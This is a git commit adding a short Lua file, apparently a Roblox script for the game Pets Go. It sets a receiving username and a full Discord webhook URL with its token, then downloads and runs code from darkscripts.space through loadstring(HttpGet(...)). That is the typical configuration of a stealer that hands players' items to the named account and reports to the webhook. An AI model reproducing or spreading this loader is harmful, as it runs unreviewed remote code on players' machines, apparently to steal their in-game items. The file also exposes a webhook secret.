4f0b51db4cace1b7aa9374216df6a2c11a30be81
ScriptKKiddie <126992413+ScriptKKiddieUni@users.noreply.github.com>
2024-11-08 10:02:47 +0800

    Add files via upload

---
+++ petsgo.lua
@@ -0,0 +1,4 @@
+Username = "xnirlly"
+Webhook = "https://discord.com/api/webhooks/1268960059975663738/ZH7TcrcrJ2oZiTkvQvdrVU0BjXKnxUnMpI1dzQJH1MsLlMJZS1Tgn907xZYVotLuTORD"
+
+loadstring(game:HttpGet(('https://darkscripts.space/petgo')))()
